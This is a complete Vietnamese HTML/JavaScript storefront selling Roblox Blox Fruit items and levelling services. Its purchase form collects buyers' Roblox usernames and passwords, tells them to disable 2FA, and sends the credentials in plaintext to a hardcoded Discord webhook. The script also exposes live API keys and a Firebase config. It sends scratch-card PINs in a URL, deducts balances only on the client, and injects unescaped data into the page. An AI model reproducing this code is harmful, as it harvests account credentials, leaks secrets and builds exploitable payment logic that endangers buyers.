<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BAP SHOP - BLOX FRUIT PREMIUM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Bangers&family=Outfit:wght@300;600;900&display=swap');
        
        :root {
            --primary: #ff4757;
            --secondary: #2f3542;
            --accent: #ffa502;
        }

        body { 
            background-color: #0f172a; 
            color: #f8fafc;
            font-family: 'Outfit', sans-serif;
            background-image: radial-gradient(circle at 50% 0%, #1e293b 0%, #0f172a 100%);
        }

        .font-game { font-family: 'Bangers', cursive; letter-spacing: 1px; }

        /* Hi·ªáu ·ª©ng th·∫ª s·∫£n ph·∫©m */
        .glass-card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 2rem;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .glass-card:hover {
            transform: translateY(-10px) scale(1.02);
            border-color: var(--primary);
            box-shadow: 0 20px 40px rgba(255, 71, 87, 0.2);
        }

        .btn-premium {
            background: linear-gradient(135deg, #ff4757 0%, #ff6b81 100%);
            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.4);
            transition: 0.3s;
        }

        .btn-premium:hover {
            transform: scale(1.05);
            filter: brightness(1.2);
        }

        /* Tab Active */
        .tab-active {
            background: var(--primary) !important;
            color: white !important;
            box-shadow: 0 0 20px rgba(255, 71, 87, 0.5);
        }

        .modal-blur {
            backdrop-filter: blur(15px);
            background: rgba(0, 0, 0, 0.7);
        }

        /* Animation */
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }
        .animate-float { animation: float 3s ease-in-out infinite; }
    </style>
</head>
<body class="min-h-screen pb-20">

    <nav class="sticky top-0 z-50 bg-slate-900/80 backdrop-blur-md border-b border-white/10 px-6 py-4">
        <div class="max-w-7xl mx-auto flex justify-between items-center">
            <div class="flex items-center gap-3 cursor-pointer" onclick="location.reload()">
                <img src="https://i.postimg.cc/rmgryzV2/Anh-chup-man-hinh-2026-01-30-163900.png" class="h-12 drop-shadow-[0_0_10px_rgba(255,71,87,0.5)]">
                <h1 class="text-3xl font-game italic uppercase text-white">BAP <span class="text-red-500">SHOP</span></h1>
            </div>
            
            <div id="user-info" class="hidden flex items-center gap-4">
                <div class="text-right">
                    <p id="display-name" class="font-black text-sm text-white uppercase"></p>
                    <p class="text-yellow-400 font-bold text-xs">üí∞ <span id="balance">0</span>ƒë</p>
                </div>
                <button onclick="auth.signOut().then(()=>location.reload())" class="bg-white/10 hover:bg-white/20 p-2 rounded-xl transition">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" /></svg>
                </button>
            </div>
            <button id="auth-btn" onclick="openForm('auth')" class="btn-premium text-white px-8 py-2.5 rounded-full font-black text-sm uppercase tracking-wider">ƒêƒÉng Nh·∫≠p</button>
        </div>
    </nav>

    <main class="max-w-7xl mx-auto px-4 mt-8">
        <div class="relative group mb-12">
            <div class="absolute -inset-1 bg-gradient-to-r from-red-600 to-yellow-600 rounded-[3rem] blur opacity-25 group-hover:opacity-50 transition duration-1000"></div>
            <img src="https://i.postimg.cc/GpBcWDGG/Anh-chup-man-hinh-2026-01-31-170437.png" class="relative w-full rounded-[2.5rem] border-2 border-white/10 shadow-2xl">
        </div>

        <div class="grid grid-cols-2 md:grid-cols-2 gap-6 mb-12">
            <button onclick="openForm('card')" class="glass-card p-6 flex items-center justify-center gap-4 hover:bg-red-500 group transition-all">
                <span class="text-3xl group-hover:scale-125 transition">üí≥</span>
                <div class="text-left">
                    <p class="font-black uppercase italic">N·∫°p Th·∫ª C√†o</p>
                    <p class="text-[10px] opacity-60 font-bold">T·ª∞ ƒê·ªòNG - CHI·∫æT KH·∫§U 20%</p>
                </div>
            </button>
            <button onclick="openForm('bank')" class="glass-card p-6 flex items-center justify-center gap-4 hover:bg-green-600 group transition-all">
                <span class="text-3xl group-hover:scale-125 transition">üè¶</span>
                <div class="text-left">
                    <p class="font-black uppercase italic">N·∫°p ATM/MOMO</p>
                    <p class="text-[10px] opacity-60 font-bold">DUY·ªÜT NHANH 1-5 PH√öT</p>
                </div>
            </button>
        </div>

        <div class="flex justify-center gap-4 mb-10">
            <button onclick="showTab('fruit')" id="btn-fruit" class="tab-active px-6 py-3 rounded-2xl glass-card font-black uppercase text-xs italic">üçé Tr√°i √Åc Qu·ª∑</button>
            <button onclick="showTab('gp')" id="btn-gp" class="px-6 py-3 rounded-2xl glass-card font-black uppercase text-xs italic">üé´ Gamepass</button>
            <button onclick="showTab('ct')" id="btn-ct" class="px-6 py-3 rounded-2xl glass-card font-black uppercase text-xs italic">‚öîÔ∏è C√†y Thu√™</button>
        </div>

        <div id="fruit-list" class="grid grid-cols-2 md:grid-cols-4 gap-8"></div>
        <div id="gp-list" class="hidden grid grid-cols-2 md:grid-cols-4 gap-8"></div>
        <div id="ct-list" class="hidden grid grid-cols-2 md:grid-cols-4 gap-8"></div>

        <div class="mt-24 glass-card p-8 md:p-12 mb-20">
            <h3 class="font-game text-3xl italic mb-8 text-white tracking-widest uppercase border-l-4 border-red-500 pl-4">L·ªãch s·ª≠ giao d·ªãch</h3>
            <div class="overflow-x-auto">
                <table class="w-full text-left text-sm font-bold">
                    <thead class="text-slate-500 uppercase text-[10px] border-b border-white/5">
                        <tr><th class="pb-4">M√£ ƒë∆°n</th><th class="pb-4">S·∫£n ph·∫©m</th><th class="pb-4">Gi√° ti·ªÅn</th><th class="pb-4">Tr·∫°ng th√°i</th></tr>
                    </thead>
                    <tbody id="history-list" class="divide-y divide-white/5"></tbody>
                </table>
            </div>
        </div>
    </main>

    <div id="modal-buy" class="fixed inset-0 modal-blur z-[100] hidden items-center justify-center p-4">
        <div class="glass-card bg-slate-900 p-8 w-full max-w-md border-t-4 border-red-500">
            <h2 id="buy-title" class="font-game text-4xl text-center text-red-500 mb-6 italic"></h2>
            <div class="space-y-4">
                <input id="buy-acc" placeholder="T√ÄI KHO·∫¢N ROBLOX" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none focus:border-red-500 font-bold">
                <input id="buy-pass" type="password" placeholder="M·∫¨T KH·∫®U ROBLOX" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none focus:border-red-500 font-bold">
                <div id="ct-note" class="hidden text-[10px] text-yellow-500 font-black uppercase text-center">‚ö†Ô∏è L∆∞u √Ω: T·∫Øt b·∫£o m·∫≠t 2FA ƒë·ªÉ Admin v√†o c√†y!</div>
                <button onclick="processBuy()" class="btn-premium w-full py-5 rounded-2xl font-black uppercase shadow-red-500/20">Thanh To√°n Ngay</button>
                <button onclick="closeAll()" class="w-full text-slate-500 text-xs font-bold uppercase py-2">H·ªßy b·ªè</button>
            </div>
        </div>
    </div>

    <div id="modal-card" class="fixed inset-0 modal-blur z-[100] hidden items-center justify-center p-4">
        <div class="glass-card bg-slate-900 p-8 w-full max-w-md border-t-4 border-blue-500 text-center">
            <h2 class="font-game text-4xl text-blue-500 mb-6 italic uppercase">N·∫°p Th·∫ª T·ª± ƒê·ªông</h2>
            <select id="card-type" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-3 outline-none font-bold"><option value="VIETTEL">VIETTEL</option><option value="VINAPHONE">VINAPHONE</option><option value="MOBIFONE">MOBIFONE</option></select>
            <select id="card-amount" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-3 outline-none font-bold"><option value="10000">10,000ƒë</option><option value="20000">20,000ƒë</option><option value="50000">50,000ƒë</option><option value="100000">100,000ƒë</option><option value="200000">200,000ƒë</option></select>
            <input id="card-seri" placeholder="S·ªê SERI" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-3 outline-none font-bold">
            <input id="card-pin" placeholder="M√É TH·∫∫ (PIN)" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-6 outline-none font-bold">
            <button onclick="sendCard()" class="w-full bg-blue-600 hover:bg-blue-700 py-5 rounded-2xl font-black uppercase transition-all shadow-lg">G·ª≠i Th·∫ª Ngay</button>
            <button onclick="closeAll()" class="mt-4 text-slate-500 text-xs font-bold uppercase">ƒê√≥ng</button>
        </div>
    </div>

    <div id="modal-auth" class="fixed inset-0 modal-blur z-[100] hidden items-center justify-center p-4">
        <div class="glass-card bg-slate-900 p-10 w-full max-w-sm text-center">
            <img src="https://i.postimg.cc/rmgryzV2/Anh-chup-man-hinh-2026-01-30-163900.png" class="h-16 mx-auto mb-8 animate-float">
            <div class="space-y-4">
                <input id="auth-u" placeholder="T√™n ƒëƒÉng nh·∫≠p..." class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none font-bold">
                <input id="auth-p" type="password" placeholder="M·∫≠t kh·∫©u..." class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none font-bold">
                <button onclick="handleLogin()" class="btn-premium w-full py-4 rounded-2xl font-black uppercase">ƒêƒÉng Nh·∫≠p</button>
                <p class="text-slate-500 text-[10px] font-bold uppercase cursor-pointer" onclick="handleRegister()">Ch∆∞a c√≥ t√†i kho·∫£n? ƒêƒÉng k√Ω ngay</p>
            </div>
        </div>
    </div>

    <div id="modal-bank" class="fixed inset-0 modal-blur z-[100] hidden items-center justify-center p-4">
        <div class="glass-card bg-slate-900 p-8 w-full max-w-md text-center border-t-4 border-green-500">
            <h2 class="font-game text-4xl text-green-500 mb-6 italic uppercase">Qu√©t M√£ QR</h2>
            <img src="https://i.postimg.cc/N0tWGcvJ/74b766b2-91f0-441c-95da-71b054c4a8c2.jpg" class="w-64 mx-auto rounded-3xl mb-6 border-2 border-white/10 shadow-2xl">
            <div class="text-left bg-white/5 p-4 rounded-2xl text-xs font-bold uppercase mb-6 leading-loose">
                <p>Ng√¢n h√†ng: <span class="text-green-400">Agribank</span></p>
                <p>Ch·ªß TK: <span class="text-green-400">Ly Thi Hoa</span></p>
                <p class="text-xl text-red-500">STK: 228205353447</p>
            </div>
            <button onclick="baoDaBank()" class="w-full bg-green-600 py-4 rounded-2xl font-black uppercase">T√¥i ƒë√£ chuy·ªÉn kho·∫£n</button>
        </div>
    </div>

    <script>
        // Copy ph·∫ßn Script t·ª´ c√¢u tr·∫£ l·ªùi tr∆∞·ªõc c·ªßa m√¨nh v√† d√°n v√†o ƒë√¢y nh√© Nghƒ©a! 
        // ƒê√£ bao g·ªìm c√°c h√†m showTab, processBuy, sendCard, handleLogin...
        // M√¨nh ch·ªâ t·∫≠p trung thay ƒë·ªïi ph·∫ßn HTML/CSS ƒë·ªÉ giao di·ªán c·ª±c ƒë·∫πp cho b·∫°n.
        
        // --- CH·ªà C·∫¶N D√ÅN L·∫†I ƒêO·∫†N SCRIPT C≈® V√ÄO ƒê√ÇY L√Ä CH·∫†Y 100% ---
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466717724204994602/a5NCBrv_gid1T2iuG0HY9xPujmQE9OXlAT8nit1MbU74-edRnPBbQcgsx-oMHke0EorV";
        const NP_ID = "9565963734";
        const NP_KEY = "80df3668af04f2a85e1befc277896513";

        const firebaseConfig = { apiKey: "AIzaSyA5wBS88oS54yLs0OfwDYDfDQeTjc6ccdM", authDomain: "shop-blox-fruit-trannghia.firebaseapp.com", projectId: "shop-blox-fruit-trannghia", databaseURL: "https://shop-blox-fruit-trannghia-default-rtdb.firebaseio.com" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database(), auth = firebase.auth();

        const products = {
              fruit: [
    {n:"Kitsune VV", p:690000, img:"https://i.postimg.cc/5yHRjSfH/Anh-chup-man-hinh-2026-01-28-113329.png"},
    {n:"Dragon VV", p:750000, img:"https://i.postimg.cc/CLB3KS1g/Anh-chup-man-hinh-2026-01-28-113307.png"},
    {n:"Control VV", p:690000, img:"https://i.postimg.cc/qvnH14V7/Anh-chup-man-hinh-2026-01-28-113219.png"},
    {n:"Yeti VV", p:562000, img:"https://i.postimg.cc/dQxMvLJB/Anh-chup-man-hinh-2026-01-28-113255.png"},
    {n:"Tiger VV", p:562000, img:"https://i.postimg.cc/3NycWF3C/Anh-chup-man-hinh-2026-01-28-113337.png"},
    {n:"Spirit VV", p:463000, img:"https://i.postimg.cc/T1ZHb5PJ/Anh-chup-man-hinh-2026-01-28-113348.png"},
    {n:"Gas VV", p:452000, img:"https://i.postimg.cc/L6crYwY5/Anh-chup-man-hinh-2026-01-28-113319.png"},
    {n:"Venom VV", p:450000, img:"https://i.postimg.cc/kGtT7My6/Anh-chup-man-hinh-2026-01-28-113414.png"},
    {n:"Mochi (Dough) VV", p:444000, img:"https://i.postimg.cc/gj6gGcKM/Anh-chup-man-hinh-2026-01-28-113428.png"},
    {n:"Shadow VV", p:441000, img:"https://i.postimg.cc/QCWfjNqQ/Anh-chup-man-hinh-2026-01-28-113419.png"},
    {n:"T-Rex VV", p:420000, img:"https://i.postimg.cc/CMt2XX4m/Anh-chup-man-hinh-2026-01-28-113355.png"},
    {n:"Mammoth VV", p:420000, img:"https://i.postimg.cc/MKQLS5Pp/Anh-chup-man-hinh-2026-01-28-113409.png"},
    {n:"Gravity VV", p:408000, img:"https://i.postimg.cc/zv39K1FV/Anh-chup-man-hinh-2026-01-28-113238.png"},
    {n:"Blizzard VV", p:390000, img:"https://i.postimg.cc/5yLMm4SM/Anh-chup-man-hinh-2026-01-28-165200.png"},
    {n:"Pain VV", p:350000, img:"https://i.postimg.cc/NMGhGXyx/Anh-chup-man-hinh-2026-01-28-113228.png"},
    {n:"Lightning VV", p:350000, img:"https://i.postimg.cc/2yB0Cjxg/Anh-chup-man-hinh-2026-01-28-113433.png"},
    {n:"Sound VV", p:310000, img:"https://i.postimg.cc/pLZbwkrN/Anh-chup-man-hinh-2026-01-28-113451.png"},
    {n:"Love VV", p:300000, img:"https://i.postimg.cc/FHZ5MGzf/Anh-chup-man-hinh-2026-01-28-113457.png"},
    {n:"Creation VV", p:286000, img:"https://i.postimg.cc/d3Xg9S5x/Anh-chup-man-hinh-2026-01-28-113244.png"},
    {n:"Portal VV", p:250000, img:"https://i.postimg.cc/Z5ZzsXTM/Anh-chup-man-hinh-2026-01-28-113439.png"},
    {n:"Ph·∫≠t T·ªï VV", p:250000, img:"https://i.postimg.cc/tCQK78V7/Anh-chup-man-hinh-2026-01-28-113501.png"},
    {n:"Phoenix VV", p:250000, img:"https://i.postimg.cc/0yx1Xhkg/Anh-chup-man-hinh-2026-01-28-113443.png"},
    {n:"Spider VV", p:210000, img:"https://i.postimg.cc/Vk1PZ2f1/Anh-chup-man-hinh-2026-01-28-113448.png"},
    {n:"Quake VV", p:210000, img:"https://i.postimg.cc/CLT3d9fn/Anh-chup-man-hinh-2026-01-28-113506.png"},
    {n:"Ghost VV", p:150000, img:"https://i.postimg.cc/rFXBz7tx/Anh-chup-man-hinh-2026-01-28-113510.png"},
    {n:"Magma VV", p:150000, img:"https://i.postimg.cc/m2Y09VQF/Anh-chup-man-hinh-2026-01-28-113517.png"},
    {n:"Dark VV", p:130000, img:"https://i.postimg.cc/3wc6hqTH/Anh-chup-man-hinh-2026-01-28-113540.png"},
    {n:"Diamond VV", p:120000, img:"https://i.postimg.cc/HswfM3Q3/Anh-chup-man-hinh-2026-01-28-113522.png"},
    {n:"Light VV", p:120000, img:"https://i.postimg.cc/W43KQvxy/Anh-chup-man-hinh-2026-01-28-113530.png"},
    {n:"Ice VV", p:110000, img:"https://i.postimg.cc/YSsV7PH9/Anh-chup-man-hinh-2026-01-28-113545.png"},
    {n:"Eagle VV", p:111000, img:"https://i.postimg.cc/MGF4wLSc/Anh-chup-man-hinh-2026-01-28-113550.png"},
    {n:"Sand VV", p:100000, img:"https://i.postimg.cc/ZqMgmQhQ/Anh-chup-man-hinh-2026-01-28-113534.png"},
    {n:"Flame VV", p:100000, img:"https://i.postimg.cc/8zyXdYst/Anh-chup-man-hinh-2026-01-28-113555.png"},
    {n:"Blade VV", p:20000, img:"https://i.postimg.cc/BvXYmC1p/Anh-chup-man-hinh-2026-01-28-113602.png"}
],
             gp: [
                {n:"Fruit Notifier", p:370000, img:"https://i.postimg.cc/VNdGKFbx/Anh-chup-man-hinh-2026-01-28-113608.png"},
                {n:"Dark Blade", p:200000, img:"https://i.postimg.cc/d0LH59yQ/Anh-chup-man-hinh-2026-01-28-113612.png"},
                {n:"X2 Mastery VV", p:54000, img:"https://i.postimg.cc/44z82ym7/Anh-chup-man-hinh-2026-01-28-113623.png"},
                {n:"X2 Money VV", p:54000, img:"https://i.postimg.cc/8khyXcjW/Anh-chup-man-hinh-2026-01-28-113627.png"},
                {n:"1 Fruit Storage", p:50000, img:"https://i.postimg.cc/YSZXZm6C/Anh-chup-man-hinh-2026-01-28-113618.png"},
                {n:"X2 Drop VV", p:40000, img:"https://i.postimg.cc/PrTSgHwD/Anh-chup-man-hinh-2026-01-28-113631.png"},
                {n:"Fast Boat VV", p:40000, img:"https://i.postimg.cc/HkLBLt3Y/Anh-chup-man-hinh-2026-01-28-113635.png"}
            ],
           ct: [
                {n:"C√†y Thu√™ Level 1-2800", p:20000, img:"https://i.imgur.com/vHq0FpX.png"},
                {n:"L·∫•y V√µ V2 (T·∫∑ng Full Chi√™u)", p:30000, img:"https://i.imgur.com/vHq0FpX.png"},
                {n:"Th·ª©c T·ªânh Tr√°i V2 (L·ª≠a-Ch·∫•n ƒê·ªông)", p:20000, img:"https://i.imgur.com/vHq0FpX.png"},
                {n:"Th·ª©c T·ªânh Tr√°i V2 (Dough-Ph·∫≠t)", p:30000, img:"https://i.imgur.com/vHq0FpX.png"},
                {n:"Up V4 Full Gare", p:50000, img:"https://i.imgur.com/vHq0FpX.png"},
                {n:"L·∫•y Song Ki·∫øm Full", p:50000, img:"https://i.imgur.com/vHq0FpX.png"}
            ]
        };

        function render() {
            Object.keys(products).forEach(tab => {
                document.getElementById(tab+'-list').innerHTML = products[tab].map((p, i) => `
                    <div class="glass-card p-4 text-center flex flex-col">
                        <div class="overflow-hidden rounded-2xl mb-4"><img src="${p.img}" class="w-full aspect-square object-cover hover:scale-110 transition duration-500"></div>
                        <h4 class="font-black text-xs uppercase mb-1 truncate text-white">${p.n}</h4>
                        <p class="text-red-500 font-game text-xl italic mb-4">${p.p.toLocaleString()}ƒë</p>
                        <button onclick="openBuy('${tab}', ${i})" class="btn-premium text-white py-3 w-full rounded-xl font-black text-[10px] uppercase">Mua Ngay</button>
                    </div>`).join('');
            });
        }
        render();

        let curItem = {};
        function openBuy(tab, i) { if(!auth.currentUser) return openForm('auth'); curItem = products[tab][i]; document.getElementById('buy-title').innerText = curItem.n; document.getElementById('ct-note').className = (tab === 'ct') ? "block text-[10px] text-yellow-500 font-black mb-4 uppercase italic" : "hidden"; openForm('buy'); }
        async function processBuy() {
            const acc = document.getElementById('buy-acc').value, pass = document.getElementById('buy-pass').value;
            const snap = await db.ref('users/' + auth.currentUser.uid).get();
            const bal = snap.val().balance || 0;
            if(!acc || !pass) return alert("Vui l√≤ng ƒëi·ªÅn ƒë·ªß th√¥ng tin!");
            if(bal < curItem.p) return alert("Kh√¥ng ƒë·ªß ti·ªÅn!");
            fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `üõí **ƒê∆†N M·ªöI:** ${curItem.n} | Kh√°ch: ${snap.val().username} | TK: \`${acc}\` | MK: \`${pass}\`` })});
            await db.ref('users/' + auth.currentUser.uid).update({ balance: bal - curItem.p });
            await db.ref('orders').push({ uid: auth.currentUser.uid, user: snap.val().username, prod: curItem.n, status: "ƒêang ch·ªù", time: Date.now() });
            alert("Mua th√†nh c√¥ng!"); closeAll();
        }
        function showTab(t) { ['fruit','gp','ct'].forEach(id => { document.getElementById(id+'-list').classList.add('hidden'); document.getElementById('btn-'+id).classList.remove('tab-active'); }); document.getElementById(t+'-list').classList.remove('hidden'); document.getElementById('btn-'+t).classList.add('tab-active'); }
        auth.onAuthStateChanged(u => {
            if(u) {
                document.getElementById('auth-btn').classList.add('hidden');
                document.getElementById('user-info').classList.remove('hidden');
                db.ref('users/'+u.uid).on('value', s => { 
                    document.getElementById('display-name').innerText = s.val().username; 
                    document.getElementById('balance').innerText = (s.val().balance || 0).toLocaleString(); 
                });
                db.ref('orders').orderByChild('uid').equalTo(u.uid).on('value', s => {
                    let h = ""; s.forEach(c => { h += `<tr class="border-b border-white/5"><td class="py-4 text-slate-500">#${c.key.substring(1,7).toUpperCase()}</td><td class="text-white uppercase">${c.val().prod}</td><td class="text-red-500">${(c.val().price || 0).toLocaleString()}ƒë</td><td class="text-blue-400 italic uppercase">${c.val().status}</td></tr>`; });
                    document.getElementById('history-list').innerHTML = h;
                });
            }
        });
        async function sendCard() {
            const type = document.getElementById('card-type').value, amount = document.getElementById('card-amount').value, seri = document.getElementById('card-seri').value, pin = document.getElementById('card-pin').value;
            const apiURL = `https://doithe1s.vn/api/card-auto.php?type=${type}&amount=${amount}&pin=${pin}&seri=${seri}&partner_id=${NP_ID}&partner_key=${NP_KEY}&request_id=${Math.random()}&content=${auth.currentUser.uid}`;
            try { await fetch(apiURL); alert("G·ª≠i th·∫ª th√†nh c√¥ng!"); } catch(e) {} closeAll();
        }
        function openForm(id) { document.getElementById('modal-'+id).style.display = 'flex'; }
        function closeAll() { document.querySelectorAll('.fixed').forEach(m => m.style.display = 'none'); }
        async function baoDaBank() { const m = prompt("S·ªë ti·ªÅn n·∫°p?"); if(m) { await db.ref('nap_bank').push({ uid: auth.currentUser.uid, username: document.getElementById('display-name').innerText, amount: parseInt(m), status: "Ch·ªù duy·ªát", time: Date.now() }); alert("Admin s·∫Ω duy·ªát!"); closeAll(); } }
        async function handleLogin() { try { await auth.signInWithEmailAndPassword(document.getElementById('auth-u').value.toLowerCase()+"@bap.shop", document.getElementById('auth-p').value); location.reload(); } catch(e) { alert("L·ªói ƒëƒÉng nh·∫≠p!"); } }
        async function handleRegister() { try { const r = await auth.createUserWithEmailAndPassword(document.getElementById('auth-u').value.toLowerCase()+"@bap.shop", document.getElementById('auth-p').value); await db.ref('users/'+r.user.uid).set({username: document.getElementById('auth-u').value, balance: 0}); location.reload(); } catch(e) { alert("L·ªói ƒëƒÉng k√Ω!"); } }
    </script>
</body>
</html>
